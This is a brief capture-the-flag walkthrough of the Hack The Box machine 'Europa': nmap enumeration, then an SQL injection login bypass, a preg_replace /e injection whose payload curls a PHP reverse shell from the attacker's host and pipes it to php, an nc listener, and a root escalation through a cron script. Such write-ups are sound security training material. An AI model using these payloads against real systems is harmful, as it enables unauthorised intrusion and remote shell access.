# Europa
### Info:

OS: Linux <br>
IP: 10.10.10.22 <br>
Difficulty : medium <br>

### Enumeration:
```
# Nmap 7.70 scan initiated Fri Jan 11 20:43:44 2019 as: nmap -sC -sV -oA nmap 10.10.10.22
Nmap scan report for 10.10.10.22
Host is up (0.33s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 11 20:56:44 2019 -- 1 IP address (1 host up) scanned in 780.23 seconds
```
### Exploitation:
We see that at port 443 https is available therefore we try opening it using the `europacorp.htb` as the host and try for SQL INJECTION.
We find that interceptiing the request via burp suit <br>
and using Username as `admin@europacorp.htb'1 OR 1=1` and password anything gets us into the dashboard.
From here we go into the Tools section and find a generate api param which can be exploited using the `preg_replace` function. <br>
We interecept the request and change :
`/ipaddress/` with /vtun0/e` and the value with `system('curl http://10.10.16.16/php-reverse-shell.php | php')` <br>
Listening on the the specified port with : 
```
nc -lvnp 8002
```
gives us the user shell. <br>
### Privilege Escalation:
Using LinEnum.sh we find a suspicion inside the `/var/www/cronlabs` parameter and using that we create a script inside `/var/www/cmd` with
a script from pentest monkey which while listening on specific port gives us the root 
